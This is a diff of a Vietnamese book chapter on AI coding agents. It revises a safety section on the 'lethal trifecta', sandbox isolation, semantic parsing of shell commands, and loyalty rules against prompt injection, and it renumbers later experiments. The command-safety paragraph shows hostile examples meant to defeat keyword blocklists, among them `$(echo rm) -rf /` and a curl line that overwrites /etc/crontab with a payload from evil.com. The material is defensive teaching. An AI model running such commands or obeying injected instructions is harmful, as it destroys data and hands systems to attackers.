-**Gợi ý thực tế**. Kết hợp lại với nhau, Coding Agent chính thống có hai tuyến: Claude Code áp dụng sơ đồ "chuỗi cũ thành chuỗi mới" - độ tin cậy được ưu tiên, việc triển khai đơn giản và không cần mô hình bổ sung; Cursor đưa lộ trình Áp dụng Mô hình lên một tầm cao mới - đầu tư vào quá trình đào tạo và suy luận của mô hình fast-apply chuyên dụng để đổi lấy thông lượng chỉnh sửa cao hơn. Đối với Agent tự xây dựng, "chuỗi cũ sang chuỗi mới" là điểm khởi đầu an toàn nhất; "khớp đầu và đuôi chuỗi" là một sự thỏa hiệp kinh tế hơn khi xử lý những thay đổi lớn; lược đồ đánh số dòng chỉ đáng tin cậy trong các trường hợp IDE được tích hợp sâu (trình soạn thảo duy trì ánh xạ số dòng trong thời gian thực và có thể cung cấp lại mô hình ngay sau mỗi lần chỉnh sửa), nếu không thì rất dễ bị lỗi do lệch số dòng.
 
 ### An toàn của Coding Agent
 
 Phần này thu gọn các tuyến phòng thủ an toàn của Coding Agent thành một mạch tự sự hoàn chỉnh: trước hết phác họa **mô hình mối đe dọa** — rủi ro nào là chí mạng nhất; tiếp đến bàn về **bao bọc cách ly** — lối ra mạng, hệ thống tệp và hạn ngạch tài nguyên của hộp cát; rồi đến **phòng thủ ở thời điểm thực thi** — phân tích ngữ nghĩa của lệnh, cùng với thực thi suy đoán khiến việc kiểm tra an toàn trở nên "vô hình"; cuối cùng quy về **niềm tin và lòng trung thành** — trong ủy thác nhiều bên thì Agent trung thành với ai, và khi bản thân mã do AI viết đã không đáng tin thì làm sao hạ ranh giới tin cậy xuống lớp dữ liệu. Trong đó, phần bàn về mô hình mối đe dọa, lòng trung thành và ranh giới tin cậy áp dụng chung cho mọi Agent, còn hộp cát và phân tích lệnh là phần tăng thêm đặc thù của Coding Agent.
 
-Mô hình “đại lý có chủ quyền” này cũng đặt ra những thách thức an ninh nghiêm trọng. Coding Agent có quyền đọc và ghi tệp, thực thi lệnh và truy cập mạng, điều đó có nghĩa là một khi các lệnh độc hại được đưa vào, nó có thể gây ra những tổn thất không thể khắc phục được. Nhà phát triển và nhà nghiên cứu độc lập Simon Willison tóm tắt rủi ro này là "Ba yếu tố chết người" nổi tiếng - khi ba yếu tố này hiện diện cùng nhau, một vòng tấn công khép kín hoàn chỉnh được hình thành và hệ thống được coi là có rủi ro cao:
+Coding Agent có quyền đọc ghi tệp, chạy lệnh, truy cập mạng; điều đó nghĩa là một khi bị tiêm chỉ dẫn độc hại thì có thể gây ra tổn thất không thể hoàn nguyên. Simon Willison đã gói gọn rủi ro này thành "bộ ba chí mạng" nổi tiếng:
 
 1. **Truy cập dữ liệu riêng tư** - Agent có thể đọc tệp người dùng và trình quản lý mật khẩu
 2. **Tiếp xúc với nội dung không đáng tin cậy**– Các email và trang web đã xử lý có thể chứa tải trọng độc hại
@@ -316,16 +328,13 @@ Ba biện pháp bổ sung này lần lượt thuộc về ba cấp độ xác mi
 
 **Bao bọc cách ly: lựa chọn kỹ thuật cho hộp cát thực thi mã.**
 
-- **Kiểm soát thoát mạng**. Đây là mục dễ bị bỏ qua nhất nhưng quan trọng nhất: ngắt kết nối mạng theo mặc định và giải phóng các đích đến có giới hạn (nguồn quản lý gói, trang tài liệu, API được tác vụ yêu cầu rõ ràng) thông qua proxy danh sách trắng theo yêu cầu. Nhìn lại yếu tố thứ ba trong ba yếu tố quan trọng - "có khả năng giao tiếp bên ngoài" - kiểm soát lối ra mạng là biện pháp bảo vệ ở cấp độ thực thi của nó: ngay cả khi việc prompt injection thành công và mã độc đọc dữ liệu nhạy cảm trong hộp cát, nó không thể được truyền đi nếu không có lối ra. Cắt bỏ các kênh gửi dữ liệu là một tuyến phòng thủ chắc chắn hơn nhiều so với việc cố gắng xác định mọi lần tiêm.
-- **Phạm vi cách ly hệ thống tệp**. Thư mục mã nguồn được gắn theo cách chỉ đọc (Agent sửa đổi mã thông qua các công cụ chỉnh sửa và các bản vá được tạo sẽ được xem xét và đưa vào đĩa hoặc bản sao được gắn vào một không gian làm việc có thể ghi) và một thư mục không gian làm việc có thể ghi riêng biệt chứa các sản phẩm được tạo và các tệp trung gian; các tệp thông tin xác thực (`~/.ssh`, khóa, mã thông báo) hoàn toàn không được gắn vào hộp cát - dữ liệu vô hình không thể bị rò rỉ, tương ứng với yếu tố đầu tiên trong ba yếu tố nghiêm trọng.
-- **Giới hạn tài nguyên và thời gian chờ**. CPU, bộ nhớ, hạn ngạch đĩa cộng với thời gian chờ của đồng hồ treo tường, bảo vệ chống lại các vòng lặp vô hạn, bom phân nhánh (quy trình tự sao chép điên cuồng cho đến khi hệ thống ngừng hoạt động) và ghi đĩa không giới hạn. Một chi tiết thực tế: vi phạm thời gian chờ và giới hạn sẽ trả lại các lỗi có cấu trúc cho Agent ("Việc thực thi đã bị chấm dứt sau hơn 120 giây, với kết quả cuối cùng như sau...") thay vì âm thầm giết chết quy trình, tạo cơ hội cho Agent sửa lại chiến lược ở vòng tiếp theo.
-- **Điều hòa các phiên liên tục với sự cô lập**. Ở phần sau của chương này, "Sự kiên trì của trạng thái trong môi trường thực thi lệnh" ủng hộ việc duy trì các phiên cuối cùng tồn tại lâu dài, trong khi nguyên tắc cô lập ủng hộ việc loại bỏ môi trường—có sự căng thẳng giữa hai điều này. Ý tưởng điều hòa là: **Phiên được duy trì bên trong hộp cát**, vòng đời của phiên cuối không vượt quá vòng đời của hộp cát và trạng thái phiên không bao giờ thoát sang máy chủ; đối với các kịch bản yêu cầu khôi phục trong khoảng thời gian dài (chẳng hạn như kiến trúc Không phiên được đề cập ở trên), hãy dựa vào ảnh chụp nhanh hộp cát hoặc "sự lưu giữ tệp vùng làm việc + tái thiết môi trường bằng tập lệnh" để khôi phục trạng thái, thay vì kéo dài thời gian tồn tại của hộp cát vô thời hạn. Nói cách khác, những gì được duy trì là một mô tả trạng thái có thể kiểm tra được (tệp, tập lệnh, bảng kê khai) chứ không phải là một quy trình chạy không rõ ràng.
+- **Kiểm soát lối ra mạng.** Đây là mục dễ bị bỏ sót nhất mà lại then chốt nhất: mặc định ngắt mạng, khi cần thì cho một proxy danh sách trắng mở đường tới một số đích hạn chế (nguồn quản lý gói, trang tài liệu, API mà nhiệm vụ rõ ràng cần đến). Hãy nhìn lại điều 3 của bộ ba chí mạng — "có khả năng liên lạc ra ngoài": kiểm soát lối ra mạng chính là tuyến phòng thủ của nó ở mặt phẳng thực thi. Dù việc tiêm prompt có thành công và mã độc đã đọc được dữ liệu nhạy cảm trong sandbox, không có lối ra thì cũng không truyền đi được.
+- **Phạm vi cách ly hệ thống tệp.** Thư mục mã nguồn được gắn ở chế độ chỉ đọc (Agent sửa mã qua công cụ chỉnh sửa, bản vá sinh ra được ghi xuống đĩa sau khi rà soát, hoặc gắn một bản sao vào vùng làm việc ghi được); một thư mục vùng làm việc ghi được riêng biệt chứa sản phẩm và tệp trung gian; các tệp chứng danh (`~/.ssh`, khóa, token) hoàn toàn không gắn vào sandbox.
+- **Hạn mức tài nguyên và thời gian chờ.** Hạn mức CPU, bộ nhớ, đĩa cộng với thời gian chờ giúp phòng vòng lặp vô hạn, fork bomb (tiến trình tự nhân bản điên cuồng đến mức kéo sập hệ thống) và việc ghi đĩa không giới hạn. Một chi tiết thực hành: khi hết thời gian chờ hay vượt hạn mức, nên trả về cho Agent một lỗi có cấu trúc ("thực thi vượt 120 giây nên bị chấm dứt, phần đầu ra cuối cùng như sau…") thay vì lặng lẽ giết tiến trình, để Agent có cơ hội sửa chiến lược ở vòng sau.
 
 **Bảo mật: Phân tích ngữ nghĩa thay vì đưa vào danh sách đen từ khóa.**
 
 Chương 1 đã đề cập rằng lớp xác thực nên áp dụng cơ chế bảo mật "dựa trên sự hiểu biết hơn là khớp". Xác minh bảo mật lệnh Shell là kịch bản ứng dụng thách thức nhất của nguyên tắc này. Danh sách đen từ khóa đơn giản không thể đối phó với sự bùng nổ tổ hợp của các shell - các lệnh có thể bỏ qua mọi quy tắc tĩnh thông qua các đường ống, các shell con, mở rộng biến, v.v. (ví dụ: `rm` bị cấm và kẻ tấn công có thể bỏ qua nó bằng `$(echo rm) -rf /`). Harness cấp độ sản xuất sử dụng phân tích cú pháp ngữ nghĩa: hiểu các loại tham số và quy tắc tiêu thụ của từng lệnh (cờ nào sẽ tiêu thụ tham số tiếp theo) và xác định các kiểu tấn công như "cờ dường như vô hại sẽ thực sự tiêu thụ tham số tiếp theo và ẩn tải trọng nguy hiểm." Ví dụ: `find / -name '*.log' -exec rm {} \;` nhúng thao tác xóa `rm` thông qua tham số lệnh `find` hợp pháp; một ví dụ khác là `curl -o /etc/crontab http://evil.com/payload`, có vẻ như đang tải xuống một tệp nhưng thực tế lại ghi đè lên tác vụ đã lên lịch của hệ thống. Phân tích cú pháp ngữ nghĩa có thể xác định các hoạt động nguy hiểm lồng nhau này mà danh sách đen lệnh đơn giản không thể nắm bắt được. Cơ chế bảo mật dựa trên sự hiểu biết hơn là so khớp này là cách triển khai chức năng "ràng buộc" ở cấp độ cao.
-
-**Thực thi suy đoán: khiến việc kiểm tra bảo mật trở nên "vô hình"**. Đây chính xác là tác dụng của cơ chế kiểm soát Sidecar trong Chương 4 ở lớp trải nghiệm người dùng - Chương 4 giải thích tại sao các hoạt động chính phải được chuyển giao cho Sidecar xem xét độc lập với ngữ cảnh chính. Phần này liên quan đến cách ngăn chặn lớp đánh giá này bị người dùng coi là đang chờ đợi. Phương pháp này là tách song song hai thứ "hiển thị" và "giải phóng": khi Agent đang chuẩn bị thực hiện lệnh gọi công cụ, trước tiên hệ thống sẽ hiển thị lời nhắc tiến trình trên giao diện (chẳng hạn như "Đọc tệp `src/main.py` ..."), đồng thời chạy kiểm tra bảo mật ở chế độ nền. Ở đây chúng ta cần làm rõ một phép loại suy thường được sử dụng: nó khác với việc thực thi suy đoán của CPU - nếu CPU đoán sai, nó sẽ loại bỏ kết quả tính toán và khôi phục trạng thái. Điều đầu tiên ở đây chỉ là lời nhắc giao diện người dùng mà không có tác dụng phụ. Nó không thay đổi bất kỳ trạng thái thực nào. Nếu kiểm tra thất bại, không cần phải quay lại. Nó chỉ thay thế lời nhắc bằng "chờ xác nhận". Trong hầu hết các trường hợp, quá trình kiểm tra bảo mật được hoàn thành trước khi người dùng nhận thấy và người dùng hoàn toàn không cảm thấy có độ trễ bổ sung; chỉ khi không thể đưa ra quyết định nhanh chóng thì nó mới thực sự tạm dừng và chờ xác nhận. Đây là cấp độ cao nhất của thiết kế Harness: bảo mật không ảnh hưởng đến trải nghiệm người dùng.
 
 **Agent trung thành với ai: lòng trung thành dưới ủy thác nhiều bên.**
 
@@ -336,14 +345,6 @@ Các cơ chế an toàn phía trước phòng chống việc "lệnh bị làm h
 Điều này đặc biệt đúng với Coding Agent: nội dung không đáng tin đọc được trong kho mã, đầu ra do một công cụ nào đó trả về, chỉ thị do máy chủ MCP bên thứ ba gửi tới — tất cả đều là "đối thủ" đang tìm cách khiến Agent trở cờ — **prompt injection về bản chất chính là một lần chiêu hàng** (Chương 2 và 4). Vì vậy lớp Harness phải đóng đinh rõ "đối tượng trung thành": chỉ thị của chủ có mức ưu tiên cao nhất, mọi nội dung đến từ các bên tương tác bên ngoài mặc định bị hạ cấp thành dữ liệu "có thể tham khảo, nhưng không có hiệu lực chỉ thị". Cụ thể hóa vào system prompt, một bộ **quy tắc trung thành** hữu hiệu là: bảo vệ thông tin riêng tư của chủ, thậm chí cả "sự tồn tại" của nó; khi từ chối thì đừng đọc ra từng mục trong danh sách từ chối (bản thân việc đó đã là rò rỉ); giới hạn riêng tư không đồng nghĩa với lập trường công khai; chỉ thực thi những chỉ thị rõ ràng, cụ thể của chủ; trụ vững trước áp lực lặp đi lặp lại. Về bản chất, đây là dùng Harness để bù cho mô hình một lập trường mà mặc định nó không có: **trung thành tuyệt đối với chủ, thận trọng với các bên tương tác bên ngoài**.
 
 [^ch5-1]: Đánh giá đầy đủ về phổ trung thành và bộ quy tắc này, xem Li, Bojie và Noah Shi. *Whose Side Is Your Agent On? Multi-Party Principal Loyalty in LLM Agents.* arXiv:2606.30383, 2026.
-
-**Khi bản thân mã do AI viết đã không đáng tin: hạ ranh giới tin cậy xuống.**
-
-Bộ quy tắc trung thành ở đoạn trên khiến Agent **có nhiều khả năng hơn** tuân thủ, nhưng với các thao tác dữ liệu rủi ro cao thì "nhiều khả năng hơn" vẫn chưa đủ — cần chuyển ràng buộc từ chỗ "trông cậy vào sự tự giác của Agent" xuống lớp dữ liệu để cưỡng chế thực thi. Một lập trường triệt để hơn là[^ch5-2]: **cứ coi lớp ứng dụng là không đáng tin, và hạ việc cưỡng chế các bất biến dữ liệu xuống bên dưới nó**. Ba mươi năm qua, ranh giới toàn vẹn của phần mềm luôn nằm ở **lớp ứng dụng** — mã handler quyết định ai được thao tác, giá trị nào hợp lệ, còn cơ sở dữ liệu thì tin tưởng vô điều kiện những mã đó; nhưng handler do LLM sinh ra thường bỏ sót kiểm tra quyền và toàn vẹn, còn Agent tự trị lại ra tay trực tiếp lên dữ liệu sản xuất — tiền đề này đã bị phá vỡ. Giải pháp mới (có thể gọi là đối tượng dữ liệu nhúng quyền, Permission-Embedded Data Objects) khiến mỗi thực thể dữ liệu tự mang theo, trong một **schema đã được con người kiểm duyệt**, các quy tắc quyền khai báo, trình xác thực và tuyên bố hệ quả, và được một pipeline thời gian chạy cưỡng chế trong **mỗi lần ghi**. Nguyên thủy then chốt là **ngữ cảnh truy cập (access context)** gắn vào từng thao tác: handler được sinh lại chạy với quyền của người dùng mà nó phục vụ, còn Agent tự trị chạy với danh tính bị giới hạn của chính nó (scoped principal) — thay vì chỉ trông cậy vào lòng trung thành của Agent, chi bằng về mặt kiến trúc hạ cấp nó thành một chủ thể quyền hạn giới hạn, để dù bị chiêu hàng nó cũng không vượt được lằn ranh.
-
-So sánh trên cùng một loạt prompt, cơ chế này đạt tới **không một lần ghi nào vi phạm bất biến đã khai báo**; trong khi SQL trần, các kiểm tra do chính LLM viết, prompt kiểu hiến pháp, các bộ chặn ranh giới hành động đều để lọt từ vài đến vài chục vi phạm. Nó không phải "có nhiều khả năng đúng hơn", mà là "không thể sai", với cái giá chỉ là mỗi lần ghi tốn thêm khoảng 2 mili giây. Tất nhiên, sự bảo đảm này có điều kiện: schema phải thực sự viết đủ mọi bất biến mong muốn, và khi triển khai phải bịt hết mọi đường để lớp không đáng tin vòng qua kho lưu trữ mà nối thẳng vào cơ sở dữ liệu. Với Coding Agent, điều này đưa ra một nguyên tắc kiến trúc quan trọng: **khi cả người viết mã lẫn người chạy mã đều có thể không đáng tin, ràng buộc thực sự đáng tin không thể nằm trong đoạn mã được sinh ra, mà phải nằm ở lớp nền do con người kiểm duyệt bên dưới nó** — đây cũng là hình thái tối hậu của nguyên tắc "ràng buộc đi trước hướng dẫn" ở Chương 1, tại lớp dữ liệu.
-
-[^ch5-2]: Thiết kế và đánh giá cho việc "hạ ranh giới tin cậy xuống dưới lớp ứng dụng" này (kèm so sánh đầy đủ số lần vi phạm của từng phương án), xem Li, Bojie. *The Application Layer Is No Longer Trusted: Enforcing Data Invariants Below AI-Written Code and AI Agents.* 2026 (sẽ xuất bản).
 
 ## Code: Meta-ability của generic Agent
 
@@ -380,7 +381,7 @@ Hãy để LLM chịu trách nhiệm tìm hiểu vấn đề và viết mã, đ�
 
 Stephen Wolfram, người sáng lập Mathematica, cung cấp cái nhìn sâu sắc về vấn đề này. Trước khi LLM xuất hiện, đã có một loại hệ thống có thể thực hiện các phép tính toán học chính xác - chúng hoạt động bằng cách sử dụng Tính toán ký hiệu, sử dụng các ký hiệu toán học thay vì các giá trị số gần đúng để xử lý biểu thức. Ví dụ: một máy tính thông thường sẽ tính $\sqrt{2}$ là 1,414, nhưng hệ thống tính toán ký hiệu sẽ giữ $\sqrt{2}$ ở dạng chính xác, chỉ chuyển đổi sang số thập phân khi cần. Wolfram Alpha, do Wolfram tạo ra, là một trong những hệ thống trong đó người dùng nhập các câu hỏi toán học và nó trả về các câu trả lời chính xác. Tuy nhiên, khả năng hiểu ngôn ngữ tự nhiên của nó khá mong manh và phạm vi bao quát của nó còn hạn chế - nó dựa vào một bộ phân tích ngữ pháp tích hợp sẵn và các câu hỏi mà nó có thể nhận ra còn hạn chế. Nếu câu hỏi có chút thay đổi, quá trình phân tích cú pháp có thể thất bại và không thể xử lý lý luận nhiều bước trong các miền mở. LLM chỉ bù đắp cho thiếu sót này - nó hiểu tốt các cách diễn đạt ngôn ngữ tự nhiên khác nhau nhưng không giỏi tính toán chính xác. Mô hình cộng tác mới là: để LLM chịu trách nhiệm tìm hiểu các vấn đề ngôn ngữ tự nhiên của người dùng, xác định các cấu trúc toán học hoặc logic trong đó và chuyển đổi chúng thành các ngôn ngữ hình thức (chẳng hạn như ngôn ngữ Mathematica hoặc thư viện SymPy của Python); sau đó chuyển nó cho một công cụ tính toán ký hiệu chuyên dụng hoặc bộ giải ràng buộc để thực thi nhằm thu được kết quả chính xác.
 
-> **Thử nghiệm 5-1 ★★: Sử dụng các công cụ tạo mã để cải thiện kỹ năng giải toán**
+> **Thử nghiệm 5-3 ★★: Sử dụng các công cụ tạo mã để cải thiện kỹ năng giải toán**
 >
 > **Mục tiêu thử nghiệm**: Xác minh rằng Agent cải thiện tính chính xác của tư duy toán học thông qua Trình thông dịch mã.
 >
@@ -389,7 +390,7 @@ Stephen Wolfram, người sáng lập Mathematica, cung cấp cái nhìn sâu s�
 > **Tiêu chí chấp nhận**: Sử dụng các câu hỏi kiểu AIME (được đo điểm chuẩn theo Cuộc thi mời gọi Toán học Hoa Kỳ) để đánh giá. So sánh độ chính xác giữa chế độ tư duy thuần túy và chế độ được hỗ trợ bằng mã, chế độ được hỗ trợ bằng mã yêu cầu độ chính xác cao hơn đáng kể. Kiểm tra xem mã có sử dụng thư viện toán học chính xác hay không và liệu quy trình giải có rõ ràng về mặt logic hay không.
 >
 
-> **Thử nghiệm 5-2 ★★: Sử dụng các công cụ tạo mã để cải thiện kỹ năng tư duy logic**
+> **Thử nghiệm 5-4 ★★: Sử dụng các công cụ tạo mã để cải thiện kỹ năng tư duy logic**
 >
 > **Mục tiêu thử nghiệm**: Đánh giá khả năng hỗ trợ tư duy logic thông qua mã giải ràng buộc của Agent.
 >
@@ -488,7 +489,7 @@ Giá trị của thiết kế này có thể được xem xét ở hai cấp đ�
 
 Như vậy, bảo đảm ba lần đã hoàn tất: (1) Quy tắc ngôn ngữ tự nhiên của lời nhắc hệ thống giúp hiểu và giải thích; (2) Mô tả công cụ và thiết kế tham số đóng vai trò như một danh sách kiểm tra để hướng dẫn mô hình kiểm tra rõ ràng các điều kiện trước khi gọi; (3) Việc xác minh được mã hóa phía máy chủ dựa trên giá trị thực của cơ sở dữ liệu đóng vai trò là người gác cổng cuối cùng. Hai cấp độ đầu tiên làm giảm khả năng xảy ra lỗi và cấp độ thứ ba đảm bảo rằng lỗi sẽ không biến thành tổn thất không thể khắc phục được.
 
-> **Thử nghiệm 5-3 ★★: Mô hình nhỏ cải thiện độ chính xác của các quy tắc thực thi thông qua kiến thức được mã hóa**
+> **Thử nghiệm 5-5 ★★: Mô hình nhỏ cải thiện độ chính xác của các quy tắc thực thi thông qua kiến thức được mã hóa**
 >
 > **Mục tiêu thử nghiệm**: Xác minh rằng mô hình tham số nhỏ (Qwen3-4B) có thể cải thiện đáng kể độ chính xác và tính nhất quán của việc thực thi chính sách phức tạp thông qua các quy tắc kinh doanh được mã hóa.
 >
@@ -507,7 +508,6 @@ Việc tạo PPT thường tốn nhiều thời gian và công sức. Một báo
 
 ![Hình 5-5 Cơ chế người đề xuất-đánh giá được tạo bởi PPT ](images/fig5-5.svg)
 
-
 Chỉ có khả năng tạo mã là không đủ. **Agent không biết hiệu ứng hiển thị thực tế sau khi viết mã**: Nội dung có quá dày đặc hay không, văn bản có bị tràn hay không, kích thước hình ảnh có phù hợp hay không, những điều này chỉ có thể được phát hiện sau khi kết xuất thực tế. Vì vậy, cần phải đưa ra cơ chế **Người đề xuất-Người đánh giá**(Proposer-Reviewer) (như trong Hình 5-5) để tách việc viết mã và đánh giá chất lượng thành hai Agent độc lập:
 
 - **Người đề xuất Agent** chịu trách nhiệm tạo mã Slidev, hiểu cấu trúc logic của nội dung và phân tách thành các trang hợp lý
@@ -517,7 +517,7 @@ Sau khi nhận được phản hồi, Người đề xuất hiểu được ý �
 
 Chu trình lặp lại của người đề xuất-người đánh giá trong chương này có cùng nguồn gốc với ứng dụng **phê duyệt trước** trong Chương 4 - cả hai đều là ví dụ về mô hình người đề xuất-người đánh giá: tách biệt giữa tạo và đánh giá, đánh giá độc lập theo mô hình kép (nói theo ngôn ngữ của Loop Engineering, đó chính là các Agent con tách biệt giữa "người tạo tác" và "bộ xác minh"). Sự khác biệt nằm ở mục tiêu và hình thức: Chương 4 sử dụng nó để xem xét bảo mật các hoạt động không thể đảo ngược và người đánh giá phê duyệt hoặc từ chối một hoạt động duy nhất; chương này sử dụng nó để cải tiến lặp đi lặp lại chất lượng nội dung—nhiều vòng và người đánh giá được tiếp xúc với thông tin mới (kết quả hiển thị) mà người đề xuất không thể nhìn thấy. Các nguyên tắc thiết kế cốt lõi đều giống nhau (chia sẻ các giới hạn mục tiêu, sử dụng các nhóm mô hình khác nhau để giảm xác suất xảy ra lỗi tương tự và phản hồi dưới dạng các sự kiện đặc biệt được thêm vào trajectory của Người đề xuất). Ưu điểm cốt lõi của việc sử dụng phân công lao động kép Agent thay vì một vòng lặp Agent duy nhất là quản lý ngữ cảnh: Người đánh giá chỉ xử lý phiên bản mới nhất của hình ảnh được hiển thị mỗi lần mà không bị các phiên bản lịch sử can thiệp; Người đề xuất chỉ tích lũy phản hồi bằng văn bản có cấu trúc, tiêu thụ ít mã thông báo hơn và dễ lý luận hơn. Giải pháp Agent duy nhất yêu cầu nhiều lần lặp lại hàng chục trang hình ảnh được kết xuất được tích lũy trong cùng một ngữ cảnh và ngữ cảnh nhanh chóng vượt quá giới hạn. Cơ chế này sẽ được sử dụng lại trong các thử nghiệm chỉnh sửa video và hiển thị nhật ký tiếp theo; Chương 10 sẽ khám phá thêm các mô hình cộng tác đa Agent khác bên cạnh người đề xuất-đánh giá.
 
-> **Thí nghiệm 5-4 ★★: Tự động tạo PPT dựa trên luận án**
+> **Thử nghiệm 5-6 ★★: Tự động tạo PPT dựa trên luận án**
 >
 > **Mục tiêu thử nghiệm**: Tự động tạo bản trình bày chất lượng cao từ các bài báo học thuật và xác minh tính hiệu quả của cơ chế người đề xuất-đánh giá trong việc kiểm soát chất lượng sáng tạo nội dung.
 >
@@ -525,12 +525,12 @@ Chu trình lặp lại của người đề xuất-người đánh giá trong ch
 >
 > **Tiêu chí chấp nhận**: Tạo trang PPT 10-20, bao gồm những đóng góp chính của bài viết. Ít nhất 3 sơ đồ gốc khớp với mô tả văn bản. Không có hiện tượng tràn văn bản trong kết xuất và bố cục hợp lý. So sánh sự khác biệt về mức tiêu thụ ngữ cảnh và chất lượng sản phẩm giữa việc một Agent tự xem xét và phân công lao động người đề xuất-đánh giá.
 >
-
-> **Thử nghiệm 5-5 ★★: Tự động tạo video giải thích bài báo**
+>
+> **Thử nghiệm 5-7 ★★: Tự động tạo video giải thích bài báo**
 >
 > **Mục tiêu thử nghiệm**: Mở rộng khả năng tạo PPT và thực hiện việc tạo video giải thích tự động bằng cách kết hợp các kênh thị giác và thính giác.
 >
-> **Giải pháp kỹ thuật**: Dựa trên quy trình tạo PPT của thử nghiệm 5-4, Agent đồng thời tạo văn bản giải thích bằng giọng nói cho mỗi trang (tường thuật có hướng dẫn thay vì kể lại), gọi TTS (chuyển văn bản thành giọng nói) để tổng hợp giọng nói và sử dụng ffmpeg để đồng bộ hóa ảnh chụp màn hình PPT với âm thanh để tổng hợp video.
+> **Giải pháp kỹ thuật**: Dựa trên quy trình tạo PPT của thử nghiệm 5-6, Agent đồng thời tạo văn bản giải thích bằng giọng nói cho mỗi trang (tường thuật có hướng dẫn thay vì kể lại), gọi TTS (chuyển văn bản thành giọng nói) để tổng hợp giọng nói và sử dụng ffmpeg để đồng bộ hóa ảnh chụp màn hình PPT với âm thanh để tổng hợp video.
 >
 > **Tiêu chí chấp nhận**: Số phút video 5-15, thời gian hiển thị của mỗi trang khớp chính xác với thời lượng giọng nói và nội dung giải thích phản ánh các yếu tố hình ảnh.
 >
@@ -540,11 +540,13 @@ Chu trình lặp lại của người đề xuất-người đánh giá trong ch
 >
 **Chỉnh sửa video Agent.**
 
+**Agent chỉnh sửa video.**
+
 Việc sử dụng Computer Use phổ biến để chỉnh sửa video phải đối mặt với những thách thức cơ bản: phần mềm chỉnh sửa video GUI cực kỳ phức tạp và chứa một số lượng lớn các mốc thời gian, lớp và bảng hiệu ứng. Agent yêu cầu định vị chính xác các thành phần giao diện này và chỉnh sửa thông qua các thao tác chuột và bàn phím, đồng thời rất khó để xuất tọa độ chính xác.
 
 Tái cấu trúc việc chỉnh sửa video thành các vấn đề về gọi và tạo mã API giúp giảm đáng kể độ phức tạp. Nhiều phần mềm chuyên nghiệp (chẳng hạn như Blender - một công cụ tổng hợp video và tạo 3D mã nguồn mở hỗ trợ kiểm soát tập lệnh Python; FFmpeg - con dao Thụy Sĩ dòng lệnh để xử lý âm thanh và video) cung cấp các giao diện API theo chương trình để hiển thị chức năng cốt lõi theo cách có cấu trúc và có thể kết hợp được. Ví dụ: Blender Python API cho phép kiểm soát chính xác việc nhập, cắt xén, sắp xếp, hiệu ứng chuyển tiếp, trộn âm thanh và các hoạt động khác của video clip thông qua mã. Mỗi thao tác tương ứng với một lệnh gọi hàm rõ ràng. Đối với Agent, việc dịch các yêu cầu ngôn ngữ tự nhiên sang các cuộc gọi API sẽ dễ dàng hơn nhiều so với việc hiểu giao diện GUI và mô phỏng các cú click chuột. Tương tự như tạo PPT, việc chỉnh sửa video cũng sử dụng cơ chế người đề xuất-đánh giá - Người đề xuất Agent tạo tập lệnh Blender, Người đánh giá Agent kết xuất các khung hình chính và sử dụng Vision LLM để kiểm tra hiệu ứng và đưa ra phản hồi cho các đề xuất sửa đổi.
 
-> **Thử nghiệm 5-6 ★★: Chỉnh sửa video thông minh dựa trên API**
+> **Thử nghiệm 5-8 ★★: Chỉnh sửa video thông minh dựa trên API**
 >
 > **Mục tiêu thử nghiệm**: Xác minh khả năng thực hiện chỉnh sửa video của Agent bằng cách tạo mã Blender Python API và đánh giá vai trò của cơ chế người đề xuất-đánh giá dựa trên phản hồi trực quan trong xử lý nội dung đa phương tiện.
 >
@@ -560,6 +562,28 @@ Tái cấu trúc việc chỉnh sửa video thành các vấn đề về gọi v
 >
 > **Tiêu chí chấp nhận**: Agent có thể xác định chính xác các cảnh khác nhau trong video và tạo chính xác các tập lệnh chỉnh sửa dựa trên hướng dẫn ngôn ngữ tự nhiên. Vị trí điểm bắt đầu và điểm kết thúc là chính xác (với sai số dưới 3 giây). Nếu hướng dẫn chứa các yêu cầu về hiệu ứng đặc biệt (chuyển động chậm, chuyển tiếp, phụ đề) thì video được tạo sẽ áp dụng các hiệu ứng một cách chính xác. Người đánh giá Agent phát hiện các lỗi rõ ràng (thiếu nội dung quan trọng, bao gồm các phân đoạn không liên quan) và yêu cầu sửa lỗi. Định dạng tệp video đầu ra cuối cùng là chính xác và chất lượng hình ảnh như mong đợi.
 >
+
+**3D và linh kiện công nghiệp: Ranh giới giữa tạo mã và mô hình sinh.**
+
+Cùng là "tạo ra một thứ", trước mặt Agent có hai con đường: một là viết mã để dựng chính xác (CadQuery, OpenSCAD, Blender API), hai là gọi trực tiếp mô hình sinh 3D (các mô hình text/image-to-3D kiểu Hunyuan 3D, cùng họ diffusion với sinh ảnh từ văn bản). Nhiều người băn khoăn: rốt cuộc khi nào nên dùng tạo mã, khi nào nên dùng mô hình sinh ảnh/3D?
+
+**Thứ nhất, xem sản phẩm có mô tả chính xác gọn hay không.** Linh kiện công nghiệp vốn có mô tả chính xác gọn. Một mặt bích: đường kính ngoài, độ dày, đường kính vòng tròn vị trí lỗ, đường kính lỗ, số lỗ — năm sáu tham số là định nghĩa trọn vẹn, mã là biểu diễn **không mất mát** của nó. Một chậu cây xanh, một tảng đá Thái Hồ, một khuôn mặt người thì khác — chúng có vô số chi tiết, **độ phức tạp nội tại gần như vô hạn**.
+
+**Thứ hai, xem yêu cầu độ chính xác và khả năng xác minh.** Mỗi kích thước của linh kiện đều là ràng buộc cứng — đường kính lỗ 5mm, dung sai ±0.05mm, sai một ly cũng thành phế phẩm. Linh kiện do mã tạo ra có thể được xác minh theo chương trình: nạp lưới, đo đường kính ngoài, vị trí lỗ, đối chiếu từng mục với đặc tả. Còn linh kiện do mô hình sinh 3D tạo ra thì không thể trực tiếp đối chiếu với đặc tả.
+
+Hai con đường còn có một khác biệt thực tế hơn nữa: **dạng biểu diễn và khả năng chỉnh sửa**. Quy trình chế tạo cần thực thể tham số hóa B-rep (biểu diễn biên) — tệp STEP lưu cây đặc trưng và các tham số kích thước, có thể trực tiếp điều khiển gia công CNC. Còn thứ mô hình sinh 3D nhả ra là lưới tam giác: mặt cong được xấp xỉ bằng vô số mảnh nhỏ vụn, phóng to lên thấy gồ ghề. Đợi đến khi phía khách hàng nói một câu "đổi lỗ lắp từ M5 thành M6", khác biệt lập tức phân minh: tuyến mã chỉ cần sửa một con số rồi chạy lại, các kích thước còn lại không sai một ly; tuyến mô hình sinh chỉ có thể tạo lại toàn bộ — các kích thước khác có bị lệch đi theo hay không hoàn toàn dựa vào may rủi.
+
